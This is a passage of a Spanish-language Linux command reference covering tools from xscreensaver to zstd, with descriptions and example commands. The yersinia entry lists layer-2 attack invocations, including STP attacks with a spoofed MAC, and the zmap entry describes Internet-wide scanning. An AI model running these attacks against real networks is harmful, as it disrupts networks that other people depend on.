	-fn fuente (Especificando fuente)


xscreensaver
[xscreensaver-screensaver-bsod]. Colección de salvapantallas. El paquete incluye el modo BSOD que muestra las populares Pantallas Azules de la Muerte de varios sistemas operativos.
$ ls /usr/libexec/xscreensaver/ (Listar todas las opciones)
$ /usr/libexec/xscreensaver/distort (Lanzando la opción distort)
$ /usr/libexec/xscreensaver//bsod


xsel
Permite manipular el portapapeles de las X desde la línea de comandos.
$ xsel -p | more  (Mostrar todo lo copiado al portapapeles)
$ xsel --clipboard --output (otra forma)
$ xsel --clipboard > archivo.txt (Volcar el contenido del portapapeles)
$ cat /etc/apt/sources.list | xsel -b  (Copiar al portapapeles)
$ xsel --clipboard  (Pegar lo copiado)
$ xsel --clipboard --clear (borrar el contenido del portapapeles)


xset
Aplicación para establecer parámetros del servidor X
# xset q (muestra información de la configuración actual)
# xset dpms 200 300 600 (segundos para entrar en standby [200], en suspenso [300] y apagado [600]
# xset m 4 (Para que el mouse se mueva más rápido. Valores de 1 a 5)
# xset -dpms (quita el apagado de pantalla)
# xset +dpms (lo activa nuevamente)
# xset dpms force off (apaga el monitor. Se enciende moviendo el cursor)
# xset s noblank  (preferencias del salvapantallas)
# xset s off (Quitar la activación del salvapantallas)
# xset fp default (restaura el path de fuentes de X)
# xset r rate 200 10 (establece retardo de 200 milisegundos y velocidad de repetición de 10 por segundo)
# xset r rate (devuelve a los parámetros por defecto)
# xset -b off/on  (Activa/desactiva los pitidos del altavoz interno)
Esto último tiene el mismo efecto que:
# nano /etc/inputrc
y desclicar la linea
	set bell-style none)


xss-lock
Herramienta para escuchar eventos XScreenSaver para suspender, hibernar, bloquear o desbloquear sesión con las acciones apropiadas.
$ nano ~/.profile
Añadir la linea
xss-lock -- /usr/bin/xscreensaver-command -lock &


xstarfish
Generador de imágenes aleatorias coloridas y en mosaico para fondo de escritorio usando funciones matemáticas. No usa imagen de origen.
$ xstarfish -d 300 (que se actualice cada 5 minutos)
$ xstarfish -g 400x400 -o walpaper.png (de 400x400 pixels, por defecto 256x256 y que se guarde con el nombre indicado)
$ xstarfish -s full -o image.png (del tamaño predeterminado del monitor y nombre de salida)


xtables_addons
[libtext-csv-xs-perl xtables-addons-common xtables-addons-dkms]. GeoIP para Iptables. Bloqueo de ataques por paises o anonimos. El proceso de instalación es el siguiete:
Configuración:
	# cd /usr/lib/xtables-addons/
	# ./xt_geoip_dl (actualizar las bases de datos)
	# mkdir -p /usr/share/xt_geoip/ (crear directorio de almacen)
	# /usr/lib/xtables-addons/xt_geoip_build -D /usr/share/xt_geoip/ *.csv (configurar todos los paises)
Una vez configurada la base de datos podemos crear normas para iptables, por ejemplo para denegar el acceso de China y los proxis anonimos a los puertos 80 y 443:
	# iptables -A INPUT -m geoip --src-cc CN -j DROP
	# iptables -A INPUT -p tcp -m tcp -m multiport --dports 80,443 -m geoip --src-cc A1 -j DROP
CN se corresponde con el código de China de la base de datos geoip que contendrá los rangos de IP que se denegarán (drop). En la segunda regla, añadiríamos el protocolo tcp, los puertos 80 (http) y 443 (https) y el rango A1 (proxies anónimos).
Si la política por defecto es denegación de servicio a todos (DROP) y queremos permitir acceso para usuarios de España, la regla sería:
	# iptables -A INPUT -p tcp -m tcp -m multiport --dports 80,443 -m geoip --src-cc ES -j ACCEPT
Nota.- Para comprobar las reglas introducidas:
	# iptables -L -n --line-numbers


xterm
Emulador de terminal
$ xterm -bg black -fg gray -bc -cr red -e ssh usuario@remoto.com
$ xterm -fg white -bg blue -e links2 http://google.es & (Abrir navegador en una terminal con fondo azul y letra blanca)
$ xterm -u8 (Arrancar la terminal con soporte utf-8 [equivalente a lanzarla con uxterm])
Opciones:
	-cr blue (cursor de color azul [white, yellow, grey, red...])
    -geom 100x100 (especificar dimensiones)
	-maximized  (Ventana maximizada)
1.-
Modificar las medidas por defecto:
# nano /usr/share/vte/termcap/xterm
Buscar la linea:
co#80:it#8:li#24:\
Y modificar los parámetros co [columnas] y li [líneas] por ejemplo:
co#120:it#8:li#15:\
2.-
Otras  personalizaciones:
Modificar o crear el archivo:
$ nano .Xresources
Pegar el contenido:
	XTerm*Background: black
	XTerm*Foreground: yellow
	XTerm*font: 9x15
	XTerm*saveLines: 1000
	XTerm*HiForeColor: white
	XTerm*HiBackColor: #c06077
$ xrdb -merge .Xresources (Aplicar los cambios, en caso contrario no se aplicaran hasta el siguiente reinicio)


xtermcontrol
Utilidad para consultar y modificar dinámicamente las propiedades de una terminal (xterm, sakura, guake...).
$ xtermcontrol --fg red --cursor yellow --title bash (letra rojo, cursor amarillo y titulo de la ventana "bash")


xtermset
Permite cambiar título, color, fuente, geometría... de una ventana de terminal. Puede aplicarse a algunas terminales como sakura, guake, xterm... No a todas. En una terminal tecleamos:
$ xtermset -n linux -T linux -fg green -cr white (título de la terminal y el icono con nombre "linux", letra verde y cursor blanco)


xtitle
Establece el título de la ventana y/o el nombre del icono de la ventana del terminal en la que se ejecuta como argumentos de la línea de comandos. A menos que se supriman los mensajes, xtitle también informará las configuraciones que ha realizado.
$ sakura (lanzamos una terminal)
$ xtitle linux (cambia el titulo de la terminal y del icono)
$ xtitle -t sakura-linux (solo lo cambia en la termminal)
$ xtitle -i linux (solo en el icono)
$ xtitle -q sakura (vuelve a dejar el título de la terminal y el icono como estaban sin mostrar la salida)


xttitle
Estable el título de la terminal y, si se indica, del icono.
$ xttitle linux linux (estable el título de la terminal y del icono)
$ xttitle bash (solo de la terminal)


xtrlock
Bloquea el servidor de las X hasta que el usuario no introduce la contraseña y pulsa enter. El cursor se convierte en un candado y el teclado no reponde. Antes de introducir la contraseña es preferible clicar "esc" para borrar todo lo que puede haberse pulsado en el teclado. La introducción de la contraseña no es visible en pantalla.
$ xtrlock


xvfb-run
Ejecutar un comando X en un entorno de servidor virtual.
$ xvfb-run --server-num=1 rdesktop -u USER -p PASS -g 1024x768 192.168.1.10 (abrir conexión de escritorio remoto sin X:)


xvkbd
Teclado virtual.


xwd
[xbase-clients]. Captura de pantalla
$ xwd > pantalla.xwd  (Capturar la ventana al clicarla)
$ xwd -root -screen > pantalla.xwd  (Capturar la ventana inmediatamente)
$ xwud -in pantalla.xwd  (Ver imágenes en formato xwd)


xwininfo
Da información acerca de la ventana que seleccionemos
$ xwininfo -root (nos da información del entorno base)
$ xwininfo -id 73402749 (nos da información de una ventana por su id)
$ xwininfo -name "nombre" (información de una ventana por su nombre 				completo)
$ xwininfo -children -root (ver todas las ventanas activas con su id y nombre)
$ xwininfo -tree -root (lo mismo que el anterior pero mostrado en arbol)
$ xwininfo -int (mostrar la id en base 10 en vez de hexadecimal)
$ xwininfo -all (nos proporciona toda la información acerca de una ventana)
$ xwininfo -all -root (nos da información de todo el entorno y ventanas existentes en la sesión de Xorg)


xwrits
Programa recordatorio diseñado para hacer saber al usuario que es hora de tomar un descanso de la escritura para evitar daños en la muñecas.
$ xwrits --multiscreen +once -t 30 -b 10 +lock (muestra en todas las pantallas, hacer clic en la ventana de advertencia, trabajar 30', por defecto 55', descanso de 10', por defecto 5' y bloquea el teclado)
Algunas otras opciones:
        password=12345 (colocar una contraseña)
        +mouse (la máquina controla los movimientos del ratón)
        minbreaktime=15 (duración mínima del descanso 15')
        +cheat=30 (permitir 30 pulsaciones antes del bloqueo)
        ct=5 (permitir 5' después de cancelar un trabajo, por defecto 10')


xymon
Sistema de monitorización de hosts y redes, inspirado en el sistema Big Brother. Proporciona monitorización en tiempo real, una sencilla interfaz web, datos históricos, informes de disponibilidad y gráficos de rendimiento. Acceder a los informes con el navegador <http://localhost/xymon>


xxd
convertir textos de ASCII a hexadecimal o viceversa.
$ xxd -p  (entra en el prompt de la aplicación. Teclear la palabra o frase y darle a intro para la conversión. Ctrl+c para salir del prompt)
$ xxd -r -p  (Proceso inverso)


xxdiff
herramienta para visualizar las diferencias entre dos o tres archivos, o dos directorios. Los textos de los dos o tres archivos se presentan uno al lado del otro, con sus diferencias resaltadas con colores para facilitar su identificación.
$ xxdiff -w -b -B -i archivo1 archivo2 (ignora los espacios en blanco, su cantidad y cambios que solo insertan o las eliminan e ignora mayusculas/minusculas)
$ xxdiff --help-html > xxdiff.html (para abrir la información con el navegador)


xxdiff-scripts
Este paquete proporciona varios scripts que se utilizan para realizar diversas tareas mediante el visor gráfico de diferencias xxdiff [ver]. Incluye las herramientas svn-foreign, termdiff, xx-cond-replace, xx-cvs-diff, xx-cvs-revcmp, xx-diff-proxy, xx-encrypted, xx-filter, xx-find-grep-sed, xx-hg-merge, xx-match, xx-p4-unmerge, xx-pyline, xx-rename, xx-sql-schemas, xx-svn-diff, xx-svn-resolve y xx-svn-review. Extensa ionformación en https://furius.ca/xxdiff/doc/xxdiff-scripts.html.


xxxterm
Navegador minimalista con soporte para flash.
Descomprimir  el archivo de configuración y copiarlo en el directorio personal:
	$ cp /usr/share/doc/xxxterm/examples/xxxterm.conf.gz .
	$ gzip -d xxxterm.conf.gz
	$ mv xxxterm.conf .xxxterm.conf (Hacerlo oculto)
Editarlo para la configuración. A título de muestra:
$ nano xxxterm.conf
	home                    = http://google.es
	window_width            = 1524
	window_height           = 768
	encoding                = UTF-8
algunos atajos:
	F6 (Barra de navegación)
	i (Buscador de la página)
	Ctrl + t (Nueva pestaña)
	Ctrl + w (Cerrar pestaña)
	Alt + h (Historial)
	F5 (Recargar página)
	/ (Buscar un termino)
	n (Siguiente termino)
	N (Anterior termino)
	Alt + q ()Reiniciar el navegador)
	Ctrl + q (Cerrar el navegador)


xz
[xz-utils]. Comprimir y descomprimir archivos. Programas incluidos en el paquete: unxz [xz --decompress], xzcat [xz --decompress --stdout], lzma [xz --format=lzma], unlzma [xz --format=lzma --decompress] y lzcat [xz --format=lzma --decompress --stdout]
$ xz -z file (comprimir)
$ xz -d file (descomprimir)
$ xz -l file1.xz file2.lzma file3.txz (información sobre archivos comprimidos)
$ xz -t file1.xz file2.lzma file3.txz (prueba la integridad de los archivos comprimidos)


y-ppa-manager
utilidad para gestionar los PPA en Launchpad.
# y-ppa-cmd (Lanza las formas de usar el comando)
# y-ppa-manager (abre la interfaz gráfica)


yacpi
Herramienta de monitoreo para portátiles.
$ yacpi
$ yacpi -n (Mostrar hasta los que no estan activos)
$ yacpi -d 2 (Actualizar los datos cada 2 segundos)
$ yacpi -b (De la bateria)
$ yacpi -f (Cel ventilador)
$ yacpi -t (La temperatura)
$ yacpi -c (De la cpu)
Para salir pulsar "q" y para actualizar datos "r"


yacy
[openjdk-6-jre-headless]. Buscador libre y descentralizado. La red no almacenada las busquedas y no es posible censurar el contenido del indice compartido. Descarga de <http://debian.yacy.net> o añadiendo al sources.list la linea:
	deb http://debian.yacy.net ./
Arrancar el demonio de forma clásica:
# /etc/init.d/yacy start (restart para reiniciar y stop para parar)
El acceso se realiza colocando en la barra de direcciones del navegador:
	http://localhost:8090
Para el acceso externo es preciso redireccionar en el router el puerto al pc correspondiente.


yafc
Cliente ftp con soporte para conexiones ftp y ssh.
$ yafc 67.33.83.15
$ yafc ssh://USER@172.17.0.221:22/documents
$ yafc ssh://USER:PASS@172.17.0.221:22/documents


yaourt
Gestor de paqueteria de archlinux que incorpora el repositorio AUR. En general tiene las mismas opciones que pacman.
$ yaourt -Syu --aur (actualización completa del sistema)
$ yaourt -C (edición y fusión de .pacnew/.pacsave)
$ yaourt -CC (eliminación de todos los .pacnew/.pacsave)
$ yaourt -S - aur paquete (fuerza la instalación desde los depósitos de AURYES)
$ yaourt -B (Realizar una copia de seguridad de la base de datos de yaourt)
1.-
Para que yaourt no pida confirmación y ver archivos:
# nano /etc/yaourtrc
Y colocar las siguientes lineas con los valores que se muestran:
	BUILD_NOCONFIRM=1
	EDITFILES=0


yapet
Registro y generador de contraseñas que se guardan cifradas.
$ yapet
Teclas de control:
	s Guardar
	r Cargar archivo
	e Crear archivo
	l Bloquear pantalla
	a Nueva entrada
	d Borrar entrada
	o Ordenar
	/ Buscar
	n Buscar siguiente
	c Cambiar contraseña
	i Información
	g Generar contraseña
	q Salir


yasat
Herramienta que permite realizar una auditoría rápida del sistema o de diferentes partes que lo componen: usuarios, servicios apache, samba, cups, php, netwirk, comprobación del kernel, etc. Por defecto los informe se guardan en ~/.yasat/).
$ yasat -l (Listar plugins disponibles)
# yasat -s (Auditoria standard del sistema)
# yasat -f (Auditoria más exhaustiva)
# yasat -a (Sin pedir confirmaciones)
Algunas opciones:
	-H (Obtener el resultado en formato html. Por defecto en ~/.yasat/yasat.html)
	--check-update (Verificar si existen actualizaciones de la aplicación)
	--skip nfs,ntp (Sólo comprobar los servicios mencionados, separados por comas)
	--html-output archivo.html (Mandar el resultado a un archivo que no sea el por defecto. Precisa tambien -H)


yash
Shell de línea de comandos que cumple con el estándar POSIX.1 (IEEE Std 1003.1, edición 2008) mucho más compatible con POSIX que otros shell como bash y zsh.
$ touch .yashrc (crear un archivo vacio de configuración para evitar que lo pida al lanzar la aplicación)
Tambien puede copiarse la que se instala por defecto
$ cp /usr/share/yash/initialization/sample .yashrc
$ yashrc (entrar en la shell)


yeahconsole
pone una ventana X un emulador de terminal en la parte superior de la pantalla que desplegable como una consola. Actualmente soporta xterm, urxvt y mrxvt.
$ yeahconsole (iniciar un emulador de terminal en la parte superior de la pantalla)
$ yeahconsole -geometry 80x20 (iniciar una terminal con 80 columnas y 20 filas)
$ yeahconsole -e htop (ejecutar htop en el terminal flotante)
Personalizar la apariencia configurando las opciones en ~/.Xresources o ~/.Xdefaults:
$ nano ~/.Xresources
Y pegar las lineas:
  yeahconsole*background: black
  yeahconsole*foreground: white
  yeahconsole*font: 10x20
  yeahconsole*toggleKey: F12
$ xrdb ~/.Xresources (recargar la configuración)
$ yeahconsole -b (ejecutar sin bordes visibles)
$ yeahconsole -s (iniciar minimizado)
$ yeahconsole -T F12 (mostrar/ocultar el terminal, si no consta el el archivo de configuración)


yelp
Navegador de ayuda de gnome. Incluye documentación detallada sobre la mayoría de aplicaciones y utilidades [panel, gestor de archivos...]


yersinia
Es un marco para realizar ataques de capa 2. Esta diseñado para aprovechar algunas debilidades en diferentes protocolos de red. Pretende ser un marco sólido para analizar y probar las redes y sistemas desplegados. Puede realizar ataques para los siguientes protocolos de red:  Protocolo Spanning Tree (STP), Protocolo de descubrimiento de Cisco (CDP), Protocolo de enlace dinámico (DTP), Protocolo de configuración dinámica de host (DHCP),  Protocolo de enrutador Hot Standby (HSRP), 802.1q, 802.1x, Protocolo de enlace entre conmutadores (ISL), Protocolo de enlace de VLAN (VTP).
# yersinia -G (arrancar el modo gráfico)
# yersinia -I (modo interactiivo ncurses)
# yersinia -D (como daemon)
# yersinia stp -attack 0 -version 2 -flags 5c -portid 3000 -interface eth1
# yersinia stp -attack 4
# yersinia stp -attack 3 -source 66:66:66:66:66:66


yes
Repetición indefinida, hasta matar el proceso con Ctrl + c,  de una palabra o frase.
$ yes linux es genial
$ yes "$(figlet Linux)" (En combinación con el comando figlet)
$ yes | rm -i * (Pasado como entrada para que conteste "si" a todo)


yetris
[libncurses5-dev]. Juego tetris para ncurses.
	$ git clone https://github.com/alexdantas/.git
	$ cd yetris
	$ make
	$ make install
$ yetris -c -g -n (En el centro de la pantalla, sin pistas de donde caen los bloques y sin color)
$ yetris -u (Mostrar el modo de uso)
$ yetris -r (Resetear las reglas)
Algunas teclas de control:
	Flechas derecha izquierda (Desplazamiento horizontal)
	espacio o flecha abajo (Desplazamiento vertical rápido)
	z, x (Rotar los bloques)
	p (Pausa. Pulsar otra vez "p" para salir de pausa)
	h (Mostrar teclas de control. Intro para salir)
	r (Reiniciar el juego)
	q (salir)


yi
Editor de texto escrito en Haskell y extensible. El objetivo del proyecto es proporcionar un editor flexible, potente y preciso para el desarrollo de código en Haskell.


ylva
Gestión de datos en un archivo encriptado con permisos chmod 600.
$ ylva -i file.db (Crea una nueva base de datos)
$ ylva -a (una entrada de datos. Pide: "Title" [único dato obligatorio los demás son opcionales], "Username", "Url", "Notes" y "Password"
$ ylva -A (listar entradas si todavia no está encriptada)
$ ylva -E (encriptar la base de datos. Pide contraseña)
$ ylva -D file.db (desencriptar la base de datos. Pide la contraseña entrada para encriptarla)
$ ylva -e 2 (editar la entrada con ID 2. Los campos que permanecen igual pulsar "intro" y modificar el que corresponda)
$ ylva -l 2 (lista toda la entrada con ID 2)
$ ylva -r 2 (eliminar la entra con ID 2)
$ ylva -p (mostrar nombre de la base de datos)


yokadi
Herramienta para organizar tareas tipo agenda. Crea una base de datos sqlite en el directorio personal [~/.yokade.db].
$ yokadi (Entra en el prompt. La primera vez que se ejecuta crea la base de datos)
Una vez en el promt, algunos comandos son:
yokadi> t_add leer El péndulo de Foucault de Umberto Eco (entrar una tarea)
yokadi> t_list (ver las tareas)
yokadi> t_mark_done 1 (borrar la tarea con el id 1)
yokadi> t_due 3 +2d (marcar la tarea 3 para dentro de 2 dias)
yokadi> t_due 3 23/04 13:00 (marcar la tarea 3 para el dia 23 de abril a la 1 del mediodia)
yokadi> t_list --all (cuanto falta hasta las fechas señaladas)
yokadi> t_list leer --all (listado de todos los libros que hemos entrado para leer)
yokadi> t_show 5 (abre el editor por defecto del sistema para modificar el texto de la tarea 5)
yokadi> t_add -c esto es muy secreto (entrar algo que no se quiere que se vea. Pide contraseña)
yokadi> c_set PASSPHRASE_CACHE 0 (a continuación esconder la contraseña entrada)
yokadi> t_list (si no se entra la contraseña no mostrará los datos)


yorick
Lenguaje de programación interpretado especializado en problemas numéricos y científicos.


you-get
[python3, ffmpeg]. Descarga de videos y, en algunos casos audio o imágenes de sitios web populares (youtube, tumblr, vimeo...) consulta de sitios soportados en <https://you-get.org/#supported-sites> . Descarga:
# pip3 install you-get
O de github <https://github.com/soimort/you-get/archive/master.zip>
$ you-get URL (descarga normal de video, audio o imagenes)
$ you-get -i URL (informacion sobre la url)
$ you-get --itag=243 URL (de la información anterior, descargar la itag 243)
$ you-get Wagner (buscar sobre el termino especificado y empieza la descarga)
$ you-get -p vlc URL (Transmitir el video por un reproductor especificado)
$ you-get -p firefox URL (transmitirlo por el navegador)
$ you-get -o /Vídeos -O titulo URL (descargar el video en un directorio y con un titulo concreto)


youtube-dl
Utilidad basada en Python que permite descargar videos de sitios populares como YouTube, Dailymotion, Photobucket, Facebook, Yahoo, Metacafe y más. Admite varios formatos de medios, incluidos MP4, WebM, etc. Esta aplicación está siendo substituida por yt-dlp [ver]
$ youtube-dl url (forma básica)
$ youtube-dl -U (actualizar la aplicación)
$ youtube-dl -o nombre.flv url  (Guardar con nombre especificado)
$ youtube-dl -a archivo_de_urls_de_youtube (bajar multiples videos)
$ youtube -upepe -pcontraseña url (especificando usuario y contraseña)
$ youtube-dl -t --extract-audio --audio-format mp3 url (Sacar el audio en formato mp3 a un video de youtube)
$ youtube-dl --write-sub --sub-lang en url (Bajar el video y los subtítulos en inglés con extensión .en.vtt si están disponibles)
	Nota.- En algunas ocasiones muestra un error (ERROR: format not available for video) se soluciona bajando directamente el ejecutable de internet y suprimiendo el de los repositorios.


yp-tools
Herramientas para interactuar con NIS [Network Information System - Sistema de Información de Red], un sistema cliente/servidor que permite compartir archivos de configuración del sistema como /etc/passwd, /etc/group, /etc/hosts, a través de la red, centralizando la gestión de cuentas. Antiguamente era conocido como Páginas Amarillas [Yellow Pages - YP]. Incluye las herramientas ypcat, ypchfn, ypchsh, ypmatch, yppasswd, ypwhich, yp_dump_binding, yppoll, ypset, yptest
$ ypcat passwd (lista todas las cuentas de usuarios del mapa passwd del servidor NIS)
$ ypchfn -f "Juan Pérez, Desarrollador" (actualiza el campo GECOS del usuario actual en el servidor NIS. Pide contraseña)
$ ypchsh -l /bin/zsh (actualiza el shell de un usuario en el mapa "passwd" NIS que actúa sobre el servidor NIS centralizado. Requiere autenticación)
$ ypmatch Perez passwd (busca la entrada del usuario "Perez" en el mapa passwd)
$ ypmatch -x (lista los mapas del servidor)
$ yppasswd -p Perez (cambia la contraseña del usuario en el servidor NIS)
$ ypwhich (muestra el hostname del servidor NIS al que está conectado el cliente actual)
$ ypwhich -m (listar todos los servidores)
$ yp_dump_binding (muestra la configuración de binding del cliente NIS, incluyendo dominios, servidores preferidos y estado de conexión)
$ yppoll -d example.com passwd nis-server.example.com (muestra estadísticas del mapa `passwd` en el servidor especificado)
$ ypset nis-backup.example.com (cambia el binding del cliente al servidor de respaldo)
$ yptest (verifica múltiples aspectos de la conexión NIS al dominio actual)
$ rpcinfo -p (verificar los servicios que están en marcha)


ypbind
Daemon cliente para trabajar con el Sistema de Información de Red [NIS]. Este daemon puede gestionar múltiples solicitudes de forma concurrente. Esto significa que puede atender varias peticiones simultáneamente sin bloquearse o tener que esperar a que una solicitud termine antes de comenzar otra.


ypserv
Servidor y otros programas necesarios para implementar un servicio NIS [ver] para cuentas y nombres de red compartidos. Incluye los ejecutables rpc.yppasswdd, rpc.ypxfrd y yppush.
# systemctl enable ypserv (habilitar que se inicie automáticamente al arrancar el sistema)
# rpc.yppasswdd (iniciar el demonio que permite a los usuarios cambiar sus contraseñas en el servidor NIS. Cuando un usuario cambia su contraseña, este demonio actualiza la base de datos de contraseñas [passwd.byname y passwd.byuid] y luego notifica a ypserv para que actualice las bases de datos NIS)
# rpc.ypxfrd (iniciar el demonio que acelera la transferencia de mapas NIS desde el servidor maestro a los esclavos)
# yppush (enviar actualizaciones a todos los servidores esclavos)
# yppush -h servidor_esclavo1 -h servidor_esclavo2 (enviar actualizaciones a servidores esclavos específicos)


yt-dlp
[FFmpeg]. Utilidad escrita en python [pip install yt-dlp] para descargar audio y video de servicios como YouTube. Es un fork de youtube-dl que actualmente parece que no se está desarrollando.
$ yt-dlp url (forma básica)
$ yt-dlp -F url (muestra diferentes formatos de descarga)
$ yt-dlp -f 137 url (especificando formato según listado anterior)


ytfzf
Script para buscar, descargar y reproducir vídeos de YouTube haciendo uso de mpv y youtube-dl. Para cada consulta de búsqueda de YouTube, se muestra una lista de resultados con el título del video, el canal que lo publicó, la cantidad de vistas, la duración, la fecha de carga y la miniatura del video.
$ ytfzf


ytree
Navegador de archivos minimalista. Puede usarse para administrar permisos en directorios, ver distintos tipos de archivos [gif, jpg, txt, html] con los visores favoritos de cada uno y revisar archivos comprimidos [tar, arc, lha, zip, zoo]. Permite configuraciones regionales UTF-8
$ ytree


yum
Gestor de programario de distros basadas Redhat
# yum install paquete  (instala paquete)
# yum -y install paquete1 paquete2 (instala los paquetes mencionados)
# yum -y install paquete.arch (instala paquete con la arquitectura mencionada: firefox.i386)
# yum -y update   (actualiza todos los paquetes del sistema)
# yum -y update --exclude=mysql (actualiza todos menos mysql)
# yum -y update gftp  (actualiza solo el paquete mencionado)
# yum check-update   (Muestra la lista de paquetes que se han de actualizar)
# yum info paquete    (Muestra información de paquete)
# yum info available   (Muestra información de los paquetes actualizables)
# yum list     (lista los paquetes disponibles)
# yum list installed  (lista los paquetes instalados en el sistema)
# yum list available (lista los paquetes disponibles)
# yum list updates   (lista los paquetes actualizables)
# yum remove paquete (suprime paquete)
# yum -y remove paquete1 paquete2  (suprime los paquetes mencionados)
# yum search paquete  (busca paquete en la base de datos)
# yum clean packages  (limpia la caché)
# yum repolist   (Lista los repositorios)


zcat
Ver contenido de archivos comprimidos con gzip.


zcmp
Compara dos archivos comprimidos (Ver cmp)


zdiff
Muestra diferencias entre dos archivos o directorios comprimidos (Ver diff)
$ zdiff archivo1 archivo2


zdump
Visualiza la zona horaria especificada.
$ zdump Madrid


zegrep
Busca expresiones regulares sobre archivos comprimidos (Ver egrep)


zellij
Es un espacio de trabajo para la terminal que permite dividirla en diferentes paneles y pestañas e incluye un motor de diseño que permite a los usuarios definir un mapa de paneles en un archivo yaml y cargarlo cuando se inicia la aplicación. También dispone de plugins como extensiones. Descarda de https://github.com/zellij-org/zellij


zenity
Creación de dialogos gráficos simples. Especialmente para scripts.
$ zenity -?   (muestra las opciones de la aplicación y de ayuda)
$ zenity --title Archivo --width 800 --height 600 --text-info --filename /home/usuario/archivo.txt (mostrar un archivo)
$ zenity --info --text="Este PC va a explotar en 10 segundos. Date por muerto."
$ zenity --password --username (Muestra diálogo entrar usuario y contraseña)
$ zenity --calendar (Muestra el calendario)
$ zenity --scale (Muestra la escala)


zerofree
Suprimir bloques libres de los sistemas de archivos ext2, ext3 y ext4, por defecto con ceros. El sistema sobre el que se actue ha de estar desmontado.
# zerofree /dev/sda1
# zerofree -n /dev/sda3 (Realizar un simulacro sin modificar el sistema de archivos)


zfgrep
Busca cadenas de texto fijas sobre archivos comprimidos (ver fgrep)


zforce
Fuerza una extensión .gz en todos los archivos gzip para que gzip no los comprima dos veces. En los sistemas con una limitación de 14 caracteres en los nombres de archivo, el nombre original se trunca para dejar espacio para el sufijo .gz. Por ejemplo, 12345678901234 se renombra a 12345678901.gz. Un nombre de archivo como foo.tgz se deja intacto.
$ zforce archivo archivo


zgrep
imprime las líneas que cumplan la expresión regula sobre ficheros comprimidos (Ver grep)


zile
Pequeño, rápido y potente clon de Emacs útil para instalaciones en dispositivos de poca capacidad (disquettes) o para sesiones de edición rápida. La mayoría de las secuencias de teclas y nombres de función son iguales que las de Emacs.
$ zile


zip
[unzip]. Compresor de archivos y directorios.
$ zip archivo.zip fichero1 fichero2 (comprimir varios ficheros)
$ zip -r archivo.zip file1 file2 dir1 (comprimir varios archivos y directorios)


zipcmp
Compara dos archivos zip y comprueba si contienen los mismos archivos,
$ zipcmp -p file1.zip file2.zip (comparando archivos y metadatos)


zipinfo
muestra información técnica sobre archivos ZIP. Dicha información incluye permisos de acceso a archivos, estado de cifrado, tipo de compresión, versión y sistema operativo o sistema de archivos del programa de compresión y similares.
$ zipinfo -h archivo.zip (Se imprime el nombre del archivo, el tamaño real en bytes)y el número total de archivos)
$ zipinfo -t archivo.zip (lista totales para todos los archivos, cantidad de archivos enumerados, tamaños totales sin comprimir y comprimidos y factor de compresión general)
$ zipinfo -l archivo.zip (lista la información del archivo zip en formato largo)


zipmerge
Fusiona un archivo zip de origen con un archivo zip de destino. De forma predeterminada, los archivos que forman parte del zip de origen sobrescriben los archivos existentes con el mismo nombre en el archivo zip de destino.
$ zipmerge -l -i origen.zip destino.zip (ignorar diferencias mayúsculas/minúsculas y preguntar antes de sobreescribir)


ziptime
Reemplaza las marcas de tiempo en los encabezados Zip con una hora estática (1 de enero de 2008). Los campos adicionales no se modifican.
$ ziptime archivo.zip


ziptool
Utilidad para manipular archivos zip modificando detalles como marcas de tiempo u otros metadatos.
$ ziptool archivo.zip add texto.txt \"Linux es un sistema genial\" (incluir en archivo.zip un texto.txt con el contenido especificado)
$ ziptool archivo.zip delete 8 (eliminar el archivo 8 del .zip especificado)
$ ziptool -c archivo.zip (verificar la coherencia del .zip al abrirlo por terminal)


zless
Pagina la visualización de un fichero comprimido (Ver less).


zmap
Herramienta que permite escanear las direcciones IP de todo Internet en menos de 1 hora. Para incrementar la velocidad, el escaneo no se realiza por orden de número de IPs sinó a saltos. Desgarga:
$ git clone https://github.com/zmap/zmap.git


zmore
Pagina la visualización de un fichero comprimido (Ver more).


znew
Permite recomprimir los ficheros comprimidos con extensión .z a .gz.
$ znew archivo.z (creará un archivo.gz. Si existe en el directorio pedirá confirmación  para sobreescribir)
$ znew -vf archivo.z (lo mismo pero sobreescribir sin confirmar)


zonemaster-cli
Utilidad para la validación DNS.
$ zonemaster-cli IP (forma básica)
$ zonemaster-cli --list_tests (listado)
$ zonemaster-cli --test basic00 IP (test sobre una opción del listado anterior de una ip)


zoo
Compresor/descompresor de archivos.
$ zoo -a archivo.zoo ficheros (Comprimir)
$ zoo -x archivo.zoo (Descomprimir)
$ zoo -v archivo.zoo (Ver contenido)


zopfli
Compresor de archivos. Incluye la aplicación zopflipng.
$ zopfli --zlib archivo (crea archivo.zlib. Si no se especifica salida [zlib] lo hace en formato gzip)
$ zopfli --deflate archivo (crea archivo.deflate)
$ zopflipng entrada.png salida.png (optimizar un archivo y escribir salida si es más pequeño)


zoxide
Herramienta que permite moverse entre directorios como el clásico cd. Se trata de una herramienta que aprende de tus movimientos y ayuda a desplazarse con el mínimo número de saltos. Es una herramienta que está inspirada en z y autojump, pero que está disponible para las shell mas utilizadas, como Bash, Zsh o Fish. Esta aplicación se puede lanzar de varias formas: z, za y zi son otra forma de utilizar zoxide de forma intereactiva. De esta forma se combina la potencia de zoxide con la potencia de fzf.
En bash colocar en ~/.bashrc la linea y recargar:
  eval "$(zoxide init bash)"
  $ source ~/.bashrc
$ za .emacs.d/elpa (entrar un nuevo directorio a la base de datos)
$ z elpa (ir al directorio especificado con za)
$ z (ir al directorio /home/usuario)
$ zi (ver directorios de la base de datos)


zrun
Hace que los archivos comprimidos que son argumentos de un comando se descompriman automáticamente. Soporta los tipos de compresión gz, bz2, Z, xz, lzma y lzo.
$ zrun grep linux archivo.gz (buscar la palabra "linux" en el comrpimido "archivo.gz")


zsh
Intérprete de comandos de UNIX que puede utilizarse como shell de inicio de sesión interactivo y como procesador de comandos de scripts de shell.
$ zsh (pasar a la shell zsh desde bash, si es la que tenemos predeterminada en el sistema)


zssh
Programa para transferir archivos a/de una máquina remota utilizando shell seguro ssh. Pretende ser una alternativa a scp [ver].


zstd
Comprimir y descomprimir archivos. Incorpora 3 ejecutables: zstdmt [equivale a zstd -T0], unzstd [equivale a zstd -d] y zstdcat [que equivale a zstd -dcf]
$ zstd -z file1 file2 file3 (crear los comprimidos file1.zst, file2.zst y file3.zst)
$ zstd -d *.zst (los descomprime sin borrar los comprimidos)
$ zstd -T0 -z archivo -o nombre.zst (comprimir un archivo con otro nombre e intente detectar y utilizar la cantidad de núcleos de CPU físicos [T0])
$ zstd -dct archivo (descomprimir, agregar verificación de integridad calculada a partir de datos sin comprimir y probar la integridad de los archivos comprimidos)


zswap
